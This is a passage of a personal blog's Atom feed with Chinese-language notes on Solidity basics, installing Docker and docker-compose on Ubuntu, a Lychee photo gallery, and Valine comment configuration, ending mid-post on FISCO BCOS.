        <content type="html"><![CDATA[<h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><h2 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function (&lt;parameter types&gt;) &#123;internal|external&#125; [pure|constant|view|payable] [returns (&lt;return types&gt;)]</span><br></pre></td></tr></table></figure><p>与参数类型相反，返回类型不能为空 —— 如果函数类型不需要返回，则需要删除整个 <code>returns (&lt;return types&gt;)</code> 部分。</p><p><strong>返回变量</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line">contract Simple &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">arithmetic</span>(<span class="params">uint _a, uint _b</span>)</span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">pure</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> (<span class="params">uint o_sum, uint o_product</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        o_sum = _a + _b;</span><br><span class="line">        o_product = _a * _b;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">arithmetic</span>(<span class="params">uint _a, uint _b</span>)</span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">pure</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> (<span class="params">uint o_sum, uint o_product</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (_a + _b, _a * _b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个返回方式相同，返回多个变量用(a,b····)</p><ul><li><p>View视图函数：<strong>保证不修改状态</strong></p><p>下面的语句被认为是修改状态：</p><ol><li>修改状态变量。</li><li><a href="https://learnblockchain.cn/docs/solidity/contracts.html#events">产生事件</a>。</li><li><a href="https://learnblockchain.cn/docs/solidity/control-structures.html#creating-contracts">创建其它合约</a>。</li><li>使用 <code>selfdestruct</code>。</li><li>通过调用发送以太币。</li><li>调用任何没有标记为 <code>view</code> 或者 <code>pure</code> 的函数。</li><li>使用低级调用。</li><li>使用包含特定操作码的内联汇编。</li></ol></li><li><p>Pure纯函数</p><p>函数可以声明为 <code>pure</code> ，在这种情况下，<strong>承诺不读取也不修改状态</strong>。</p><p>除了上面解释的状态修改语句列表之外，以下被认为是读取状态：</p><ol><li>读取状态变量。</li><li>访问 <code>address(this).balance</code> 或者 <code>&lt;address&gt;.balance</code>。</li><li>访问 <code>block</code>，<code>tx</code>， <code>msg</code> 中任意成员 （除 <code>msg.sig</code> 和 <code>msg.data</code> 之外）。</li><li>调用任何未标记为 <code>pure</code> 的函数。</li><li>使用包含某些操作码的内联汇编。</li></ol></li><li><p>receive接受一台函数</p></li><li><p>Fallback回退函数</p></li></ul><h2 id="地址类型Address"><a href="#地址类型Address" class="headerlink" title="地址类型Address"></a>地址类型Address</h2><p><code>address</code>：保存一个20字节的值（地址的大小）</p><p><code>address payable</code> ：可支付地址，与 <code>address</code> 相同，不过有成员函数 <code>transfer</code> 和 <code>send</code></p><h2 id="可见性和getter函数"><a href="#可见性和getter函数" class="headerlink" title="可见性和getter函数"></a>可见性和getter函数</h2><p>由于 Solidity 有两种函数调用（内部调用不会产生实际的 EVM 调用或称为“消息调用”，而<strong>外部调用</strong>则会产生一个 EVM 调用）， 函数和状态变量有四种可见性类型。 函数可以指定为 <code>external</code> ，<code>public</code> ，<code>internal</code> 或者 <code>private</code>。 对于状态变量，不能设置为 <code>external</code> ，默认是 <code>internal</code> 。</p><h3 id="getter函数"><a href="#getter函数" class="headerlink" title="getter函数"></a>getter函数</h3><p>编译器自动为所有 <strong>public</strong> 状态变量创建 getter 函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity  &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line">contract C &#123;</span><br><span class="line">    uint <span class="keyword">public</span> data = <span class="number">42</span>;</span><br><span class="line">&#125;</span><br><span class="line">contract Caller &#123;</span><br><span class="line">    C c = <span class="keyword">new</span> C();</span><br><span class="line">    <span class="function">function <span class="title">f</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint local = c.data();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于Caller合约，编译器会生成一个data的函数，该函数没有参数，返回值是一个<code>uint</code>类型，即状态变量<code>data</code>的值，getter 函数具有外部（external）可见性。</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>一个元素类型为 <code>T</code>，固定长度为 <code>k</code> 的数组可以声明为 <code>T[k]</code>，而动态数组声明为 <code>T[]</code></p><p> 举个例子，一个长度为 5，元素类型为 <code>uint</code> 的动态数组的数组（二维数组），应声明为 <code>uint[][5]</code> （注意这里跟其它语言比，数组长度的声明位置是反的）。</p><h1 id="函数修饰器"><a href="#函数修饰器" class="headerlink" title="函数修饰器"></a>函数修饰器</h1><p>使用 修改器modifier 可以轻松改变函数的行为</p><p>修改器modifier 是合约的可继承属性，并可能被派生合约覆盖 , 但前提是它们被标记为 <code>virtual</code>.</p><h1 id="投票例子"><a href="#投票例子" class="headerlink" title="投票例子"></a>投票例子</h1><p>数据结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//表示一个选民</span></span><br><span class="line">struct Voter &#123;</span><br><span class="line">        uint weight; <span class="comment">// 计票的权重</span></span><br><span class="line">        bool voted;  <span class="comment">// 若为真，代表该人已投票</span></span><br><span class="line">        address delegate; <span class="comment">// 被委托人</span></span><br><span class="line">        uint vote;   <span class="comment">// 投票提案的索引</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 提案的类型</span></span><br><span class="line">struct Proposal &#123;</span><br><span class="line">        string name;   <span class="comment">// 简称（最长32个字节）</span></span><br><span class="line">        uint voteCount; <span class="comment">// 得票数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//提案人</span></span><br><span class="line">address public chairperson;</span><br><span class="line"><span class="comment">//投票者的map图</span></span><br><span class="line">mapping(<span class="function"><span class="params">address</span> =&gt;</span> Voter) public voters;</span><br><span class="line"><span class="comment">//提案数组</span></span><br><span class="line">Proposal[] public proposals</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Docker安装以及使用</title>
      <link href="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="docker是什么"><a href="#docker是什么" class="headerlink" title="docker是什么"></a>docker是什么</h1><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。Docker利用Linux核心中的资源分离机制，例如cgroups，以及Linux核心命名空间（name space），来建立独立的软件容器（containers）。这可以在单一Linux实体下运作，避免启动一个虚拟机器造成的额外负担。</p><p><img src="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20210405123928706.png" class="lazyload" data-srcset="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20210405123928706.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405123928706" style="zoom: 25%;"><img src="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20210405123950254.png" class="lazyload" data-srcset="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20210405123950254.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405123950254" style="zoom:25%;"></p><h1 id="安装（Ubuntu）"><a href="#安装（Ubuntu）" class="headerlink" title="安装（Ubuntu）"></a>安装（Ubuntu）</h1><h2 id="更新apt软件包索引并安装软件包以允许apt通过HTTPS使用存储库："><a href="#更新apt软件包索引并安装软件包以允许apt通过HTTPS使用存储库：" class="headerlink" title="更新apt软件包索引并安装软件包以允许apt通过HTTPS使用存储库："></a>更新<code>apt</code>软件包索引并安装软件包以允许<code>apt</code>通过HTTPS使用存储库：</h2><p>大多数用户会 <a href="https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository">设置Docker的存储库</a>并从中进行安装，以简化安装和升级任务。这是推荐的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install \</span><br><span class="line">   apt-transport-https \</span><br><span class="line">   ca-certificates \</span><br><span class="line">   curl \</span><br><span class="line">   gnupg \</span><br><span class="line">   lsb-release</span><br></pre></td></tr></table></figure><h2 id="添加官方的GPG密钥"><a href="#添加官方的GPG密钥" class="headerlink" title="添加官方的GPG密钥"></a>添加官方的GPG密钥</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure><h2 id="使用以下命令来设置稳定的存储库。要添加-夜间或测试存储库，请在下面的命令中在单词后面添加nightly或test（或两者）stable。"><a href="#使用以下命令来设置稳定的存储库。要添加-夜间或测试存储库，请在下面的命令中在单词后面添加nightly或test（或两者）stable。" class="headerlink" title="使用以下命令来设置稳定的存储库。要添加 夜间或测试存储库，请在下面的命令中在单词后面添加nightly或test（或两者）stable。"></a>使用以下命令来设置<strong>稳定的</strong>存储库。要添加 <strong>夜间</strong>或<strong>测试</strong>存储库，请在下面的命令中在单词后面添加<code>nightly</code>或<code>test</code>（或两者）<code>stable</code>。</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo \</span><br><span class="line"> &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="line"><span class="meta"> $</span><span class="bash">(lsb_release -cs) stable<span class="string">&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span></span></span><br></pre></td></tr></table></figure><h2 id="安装Docker引擎"><a href="#安装Docker引擎" class="headerlink" title="安装Docker引擎"></a>安装Docker引擎</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><h2 id="运行helloword测试是否安装成功"><a href="#运行helloword测试是否安装成功" class="headerlink" title="运行helloword测试是否安装成功"></a>运行helloword测试是否安装成功</h2><img src="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20210405125028874.png" class="lazyload" data-srcset="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20210405125028874.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405125028874" style="zoom: 67%;"><h1 id="Registry——镜像仓库"><a href="#Registry——镜像仓库" class="headerlink" title="Registry——镜像仓库"></a>Registry——镜像仓库</h1><ul><li>Docker Hub 是Docker官方的镜像站，类似Github一般的存在，注册后我们也可以往上面上传镜像</li><li>registry 是存放和分发Docker镜像的一个服务</li></ul><ol><li>Docker hub 可以类比为 Github，是一个公共的镜像服务中心</li><li>搭建 Registry 可以类比为搭建 GitLab 服务器，是一个私有的镜像服务中心</li><li>自建 Registry 可以让镜像私有化，也可以提高镜像拉取速度</li></ol><h1 id="基础容器操作"><a href="#基础容器操作" class="headerlink" title="基础容器操作"></a>基础容器操作</h1><p><a href="https://blog.csdn.net/zhangjiaweizk/article/details/108605185">https://blog.csdn.net/zhangjiaweizk/article/details/108605185</a></p><h2 id="查看运行的容器"><a href="#查看运行的容器" class="headerlink" title="查看运行的容器"></a><strong>查看运行的容器</strong></h2><p>CONTAINER ID:容器ID</p><p>IMAGE:使用镜像</p><p>COMMAND:启用镜像使用命令</p><p>STATUS:容器状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dokcer ps</span><br><span class="line">-a：显示所有的容器，包括未运行的。</span><br><span class="line"></span><br><span class="line">-f：根据条件过滤现实的内容。</span><br><span class="line"></span><br><span class="line">–format：指定返回值的模板文件。</span><br><span class="line"></span><br><span class="line">-l：显示最近创建的容器。</span><br><span class="line"></span><br><span class="line">-n：列出最近创建的n个容器。</span><br><span class="line"></span><br><span class="line">–no-trunc：不截断输出。</span><br><span class="line"></span><br><span class="line">-q：静默模式，只显示容器编号。</span><br><span class="line"></span><br><span class="line">-s：显示总的文件大小。</span><br></pre></td></tr></table></figure><img src="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20210405141153758.png" class="lazyload" data-srcset="/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20210405141153758.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405141153758" style="zoom:50%;"><h2 id="容器运行"><a href="#容器运行" class="headerlink" title="容器运行"></a><strong>容器运行</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">docker run</span><br><span class="line">-a stdin : 制定标准输入输出内容类型，可选STDIN/STDOUT/STDERR三项；</span><br><span class="line"></span><br><span class="line">-d ：后台运行容器，并返回容器ID；</span><br><span class="line"></span><br><span class="line">-i：以交互式运行容器，通常与-t同时使用；</span><br><span class="line"></span><br><span class="line">-P：随机端口映射，容器内部端口随机映射到主机的端口</span><br><span class="line"></span><br><span class="line">-p：指定端口映射，格式为:主机（宿主）端口：容器端口</span><br><span class="line"></span><br><span class="line">-t：为容器重新分配一个伪输入终端，通常与-i同时使用；</span><br><span class="line"></span><br><span class="line">–name=“nginx-lb”：为容器指定一个名称；</span><br><span class="line"></span><br><span class="line">–dns 8.8.8.8：指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">–dns-search example.com：指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">-h “mars&quot;：指定容器的hostname；</span><br><span class="line"></span><br><span class="line">-e username=“ritchie”：设置环境变量；</span><br><span class="line"></span><br><span class="line">–env-file=[]：从指定文件读入环境变量；</span><br><span class="line"></span><br><span class="line">–cpuset=”0-2“ or --cpuset=“0,1,2”：绑定容器到指定CPU运行；</span><br><span class="line"></span><br><span class="line">-m：设置容器使用内存最大值；</span><br><span class="line"></span><br><span class="line">–net=“bridge”：指定容器的网络链接类型，支持bridge/host/none/container 四种类型；</span><br><span class="line"></span><br><span class="line">–link=[]：添加链接到另一个容器；</span><br><span class="line"></span><br><span class="line">–expose=[]：开放一个端口或一组端口；</span><br><span class="line"></span><br><span class="line">–volume ，-v：绑定一个卷</span><br></pre></td></tr></table></figure><h2 id="docker-start-stop-restart"><a href="#docker-start-stop-restart" class="headerlink" title="docker start/stop/restart"></a><strong>docker start/stop/restart</strong></h2><p>docker start ：启动一个或多个已经被停止的容器</p><p>docker stop：停止一个运行的容器</p><p>docker restart：重启容器</p><h2 id="docker-kill"><a href="#docker-kill" class="headerlink" title="docker kill"></a>docker kill</h2><p>docker kill：杀掉一个运行中的容器</p><h2 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h2><p>docker rm：删除一个或多个容器。</p><p>-f：通过SIGKILL信号强制删除一个运行中的容器。</p><p>-l：移除容器间的网络连接，而非容器本身。</p><p>-v：删除与容器关联的卷。</p><h2 id="docker-pause-unpause"><a href="#docker-pause-unpause" class="headerlink" title="docker pause/unpause"></a>docker pause/unpause</h2><p>docker pause：暂停容器中所有的进程。</p><p>docker unpause：回复容器中所有的进程。</p><h1 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="docker使用命令"><a href="#docker使用命令" class="headerlink" title="docker使用命令"></a>docker使用命令</h2><p>docker是根据里面的docker-compose.yaml文件构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lychee-web相册</title>
      <link href="/2021/04/04/%E5%8D%9A%E5%AE%A2/Lychee-web%E7%9B%B8%E5%86%8C/"/>
      <url>/2021/04/04/%E5%8D%9A%E5%AE%A2/Lychee-web%E7%9B%B8%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<p>该图床使用docker以及docker-compose</p><p>安装以上两个后<a href="https://github.com/LycheeOrg/Lychee-Docker">https://github.com/LycheeOrg/Lychee-Docker</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>然后初始账号为lychee 密码lychee</p><p>登录成功后</p><p><img src="/2021/04/04/%E5%8D%9A%E5%AE%A2/Lychee-web%E7%9B%B8%E5%86%8C/image-20210405165534792.png" class="lazyload" data-srcset="/2021/04/04/%E5%8D%9A%E5%AE%A2/Lychee-web%E7%9B%B8%E5%86%8C/image-20210405165534792.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405165534792"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客配置</title>
      <link href="/2021/04/01/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/04/01/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="设置一个评论系统"><a href="#设置一个评论系统" class="headerlink" title="设置一个评论系统"></a>设置一个评论系统</h1><h2 id="注册leanCloud账号"><a href="#注册leanCloud账号" class="headerlink" title="注册leanCloud账号"></a>注册leanCloud账号</h2><p><a href="https://www.leancloud.cn/">https://www.leancloud.cn/</a> 创建一个应用拿到里面的AppleID AppKey</p><img src="/2021/04/01/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/image-20210401195938050.png" class="lazyload" data-srcset="/2021/04/01/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/image-20210401195938050.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210401195938050" style="zoom:67%;"><h2 id="使用配置文档"><a href="#使用配置文档" class="headerlink" title="使用配置文档"></a>使用配置文档</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">comments:</span><br><span class="line">  title: &lt;i class=&#x27;fas fa-comments&#x27;&gt;&lt;/i&gt; 评论</span><br><span class="line">  subtitle:</span><br><span class="line">  service: valine </span><br><span class="line">  # Valine</span><br><span class="line">  # https:<span class="comment">//valine.js.org/</span></span><br><span class="line">  valine:</span><br><span class="line">    # js: https:<span class="comment">//cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js</span></span><br><span class="line">    path: # 全局评论地址 目前设置全局评论地址后visitor失效,这是valine的问题</span><br><span class="line">    placeholder: 快来评论吧~  # 评论占位提示</span><br><span class="line">    # 其他配置项按照yml格式继续填写即可 除了 [el path placeholder emojiCDN emojiMaps] 选项</span><br><span class="line">    appId: &#x27;sqTMFb0PVPGr3O8jFPjCPlRd-gzGzoHsz&#x27;# your appId</span><br><span class="line">    appKey: &#x27;c8anwbejIe6cHBJju8X7Wt3U&#x27; # your appKey</span><br><span class="line">    meta: [nick,mail] # valine comment header info</span><br><span class="line">    requiredFields: [nick,mail]</span><br><span class="line">    enableQQ: <span class="literal">true</span> # Unstable avatar link</span><br><span class="line">    recordIP: <span class="literal">false</span> # Record commenter IP</span><br><span class="line">    avatar: robohash # gravatar style https:<span class="comment">//valine.js.org/avatar</span></span><br><span class="line">    pageSize: <span class="number">10</span> # comment list page size</span><br><span class="line">    lang: zh-cn</span><br><span class="line">    highlight: <span class="literal">true</span></span><br><span class="line">    mathJax: <span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>用过一次里面的配置文件，再进行更改下面的选项 要重新创建一个应用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meta: [nick,mail] # valine comment header info</span><br><span class="line">requiredFields: [nick,mail]</span><br></pre></td></tr></table></figure><img src="/2021/04/01/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/image-20210402104953113.png" class="lazyload" data-srcset="/2021/04/01/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/image-20210402104953113.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210402104953113" style="zoom:50%;">]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FISCO BCOS区块链</title>
      <link href="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/"/>
      <url>/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/</url>
      
        <content type="html"><![CDATA[<h1 id="Solid语法基础"><a href="#Solid语法基础" class="headerlink" title="Solid语法基础"></a>Solid语法基础</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>Solidity是一种静态类型语言，这意味着每个变量（状态和本地）的类型需要 在编译时 指定Solidity提供了几种基本类型，可以组合形成复杂的类型</p><h2 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h2><p>以下类型也被称为值类型，因为这些类型的变量将始终按值传递，即它们在用作函数参数或赋值时总是被复制</p><h3 id="地址-address"><a href="#地址-address" class="headerlink" title="地址(address)"></a>地址(address)</h3><p>保存20个字节的值（以太坊地址的大小）。地址类型也有成员，并作为所有合同的基础</p><h3 id="地址成员"><a href="#地址成员" class="headerlink" title="地址成员"></a>地址成员</h3><h4 id="balance和transfer"><a href="#balance和transfer" class="headerlink" title="balance和transfer"></a>balance和transfer</h4><p>地址是solidity语言的预置对象，就如同Java里面的JDK自带类。balance可以查询余额，transfer则实现转账功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address x = <span class="number">0x123</span>;</span><br><span class="line">address myAddress = 